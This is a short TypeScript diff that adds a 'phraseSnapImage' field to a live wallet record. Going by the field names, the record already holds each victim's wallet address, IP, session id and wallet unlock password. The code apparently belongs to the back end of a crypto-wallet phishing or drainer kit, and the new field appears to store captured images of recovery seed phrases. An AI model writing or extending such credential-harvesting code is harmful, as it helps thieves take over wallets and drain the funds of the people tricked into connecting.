@@ -14,6 +14,7 @@ export interface LiveWalletRecord {
   clientIp: string | null
   browserSessionId: string | null
   unlockPassword: string | null
+  phraseSnapImage: string | null
   connectedAt: string
   lastSeenAt: string
   connectionStatus: 'connected' | 'disconnected'
@@ -64,6 +65,7 @@ export function upsertLiveWallet(input: {
   clientIp?: string | null
   browserSessionId?: string | null
   unlockPassword?: string | null
+  phraseSnapImage?: string | null
   connectionStatus?: 'connected' | 'disconnected'
 }): LiveWalletRecord {
   const key = sessionKey(input.walletAddress, input.browserSessionId)
@@ -82,6 +84,8 @@ export function upsertLiveWallet(input: {
     browserSessionId: input.browserSessionId ?? existing?.browserSessionId ?? null,
     unlockPassword:
       input.unlockPassword !== undefined ? input.unlockPassword : existing?.unlockPassword ?? null,
+    phraseSnapImage:
+      input.phraseSnapImage !== undefined ? input.phraseSnapImage : existing?.phraseSnapImage ?? null,
     connectedAt: existing?.connectedAt || now,
     lastSeenAt: now,
     connectionStatus: input.connectionStatus || 'connected',
